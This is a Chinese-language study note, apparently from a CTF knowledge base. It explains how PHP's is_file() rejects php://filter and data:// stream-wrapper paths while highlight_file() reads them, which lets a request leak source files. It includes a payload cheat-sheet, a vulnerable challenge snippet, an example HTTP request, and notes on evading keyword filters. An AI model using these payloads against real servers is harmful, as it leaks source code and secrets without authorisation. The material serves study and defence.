---
title: PHP highlight_file() 的特殊行为
category: 基础/PHP
tags: [PHP, highlight_file, is_file, 流包装器, php://filter, 源码泄露]
order: 7
---

## 一句话概括

`highlight_file()` 的「特殊行为」是：**它会走 PHP 的流包装器（stream wrapper）去取数据，而 `is_file()` 只认真实文件系统路径。** 于是出现了「`is_file()` 判断为 `false`、`highlight_file()` 却能正常处理」的分裂 —— 这个分裂正是绕过文件检查、读出源码的突破口。

## 原理

### 1. 两个函数对「一个路径」的处理方式根本不同

| 函数 | 请求路径时发生什么 | 支持 `php://` / `data://` 等包装器吗 |
| :--- | :--- | :--- |
| `is_file($path)` | 直接问**文件系统**：「这个路径是不是一个普通文件」 | **不支持** → 返回 `false` |
| `highlight_file($path)` | 走 **PHP 流层**打开 `$path`，把读到的内容做语法高亮后输出 | **支持** → 正常处理 |

```php
// 这些在 is_file() 中都返回 false
is_file("php://input");            // false
is_file("php://filter/...");       // false
is_file("data://text/plain,...");  // false

// 但这些在 highlight_file() 中都能工作
highlight_file("php://filter/..."); // 显示经过过滤的内容
```

### 2. 为什么会这样：一层抽象的有无

PHP 的文件操作其实分两条路：

```text
路径字符串
    │
    ├──► 路径类函数（is_file / file_exists / is_dir）
    │         └─ 直接落到底层 stat() 系统调用，只懂「真实路径」
    │            → "php://..." 不是一个真实路径，stat 失败 → false
    │
    └──► I/O 类函数（file_get_contents / fopen / readfile / highlight_file / include）
              └─ 先经过 stream wrapper 层
                 → 看到 "php://" 前缀就交给 php 包装器处理
                 → 看到 "file://" 就交给 file 包装器
                 → 看到 "data://" 就交给 data 包装器
                 → 只有都不匹配时才当普通文件
```

**关键点：`php://filter` 不是文件，是一条「管道」。** 它由三段构成：

```text
php://filter/read=convert.base64-encode/resource=flag.php
└────┬──────┘ └──┬──┘ └──────────┬──────────┘ └───┬────┘
  包装器名      读方向        要施加的过滤器      真正要读的目标
```

- `resource=` 后面才是**真正的文件**；
- `read=` 后面是**读之前要做的加工**（`convert.base64-encode` 会把内容 Base64 编码后交给你）。

所以 `is_file()` 看到的是一串「不是路径的东西」→ `false`；而 `highlight_file()` 看到的是「一个能打开的数据源」→ 正常工作。

### 3. 无过滤时的直接后果

```php
if (is_file($file)) {
    // 分支 A：是真实文件 → 展示或执行
} else {
    highlight_file(filter($file));   // 分支 B
}
```

- 真实路径如 `/flag.php` → `is_file()` 为 `true` → 走分支 A（可能被拦、可能被执行）
- 包装器路径如 `php://filter/...` → `is_file()` 为 **`false`** → **落进分支 B** → 被 `highlight_file()` 完整读取并输出

**你以为 `is_file()` 是在做安全校验，实际上它成了把你引到「无检查分支」的路标。**

### 4. 漏洞利用链总结（原文）

1. **输入流包装器**：`php://filter/convert.iconv.../resource=flag.php`
2. **绕过文件检查**：`is_file()` 返回 `false`（因为不是真实文件路径）
3. **进入显示分支**：执行 `highlight_file(filter($file))`
4. **过滤器处理**：编码转换破坏 PHP 语法
5. **最终结果**：显示 `flag.php` 源码而不是执行它

> **第 4 步为什么要「破坏 PHP 语法」？** 因为 `highlight_file()` 的输出会经过 PHP 的语法高亮。如果读到的内容里带 `<?php ... ?>`，某些场景下内容可能被当成代码处理；用 `convert.base64-encode` 或 `iconv` 系列过滤器把内容变成「看不懂的字节」，就彻底只当**纯文本**了。同时 Base64 编码还能避免文件中的特殊字节（如 `%00`）破坏响应。

## 利用条件

1. **存在可控的路径参数**：如 `?file=`、`?filename=`，直接传给 `highlight_file()`；
2. **有「先检查再使用」的代码结构**：典型是 `if (is_file($f)) {...} else { highlight_file($f); }`，且检查用的函数**不认包装器**；
3. **包装器没被禁用**：`allow_url_include`、`php://` 相关限制未被 `open_basedir` / `disable_functions` 掐死；
4. **目标文件可读**：`resource=` 指向的文件进程有读权限。

## Payload 速查

| 目的 | Payload |
| :--- | :--- |
| 读源码（最常用） | `?file=php://filter/convert.base64-encode/resource=flag.php` |
| 读源码（ROT13） | `?file=php://filter/read=string.rot13/resource=index.php` |
| 读源码（iconv 系列） | `?file=php://filter/convert.iconv.utf-8.utf-16/resource=flag.php` |
| 读 POST 原文 | `?file=php://input`（内容来自请求体） |
| 读内存中的数据 | `?file=php://memory`、`?file=php://temp` |
| 内联数据当文件 | `?file=data://text/plain;base64,PD9waHAg...` |
| 用 filter 链绕过关键字过滤 | `?file=php://filter/convert.iconv.../resource=flag.php`（多个 `|` 串联多个过滤器） |

## 完整示例

题面代码：

```php
<?php
error_reporting(0);
$file = $_GET['file'];
if (is_file($file)) {
    die("不是文件就是不行~");
} else {
    highlight_file(filter($file));
}
```

- `?file=index.php` → **是**真实文件 → `is_file()` 为真 → 被 `die` 掉，什么都看不到
- `?file=php://filter/convert.base64-encode/resource=index.php` → 包装器路径 → `is_file()` 为**假** → 走 `else` → `highlight_file()` 输出源码

请求：

```http
GET /?file=php://filter/convert.base64-encode/resource=index.php HTTP/1.1
Host: 靶机地址
```

响应（片段）：

```text
PD9waHAKCmVycm9yX3JlcG9ydGluZygwKTsKJ...
```

解码：

```bash
echo "PD9waHAK..." | base64 -d
```

得到完整的 `index.php` 明文源码。

## 踩坑与备注

- **`filter()` 这个函数名容易误导**：这类题里的 `filter($file)` 通常是题目自定义的「过滤函数」（比如 `str_replace('php', '', $file)`），**不是 PHP 内置函数**。它会拦掉 `php://` 关键字，所以前面的 payload 常要配合双写、大小写、编码等绕过手法。
- **`is_file()` 不是唯一不认包装器的函数**，`file_exists()`、`is_dir()`、`is_readable()` 同理，都可能被同一个思路绕过；反过来 `file_get_contents()`、`readfile()`、`fopen()`、`include()` 都认包装器。
- **`open_basedir` 是这套手法的主要克星**：它一旦限制到某目录，`php://` 之外就出不去，文章里的路径遍历也要跟着失效。
- **原文只有结论（两条对比 + 五步链路）**，本文补齐了「为什么会分裂（stat vs stream wrapper）」「`php://filter` 的段结构」「第 4 步为什么要编码」这三层推导。
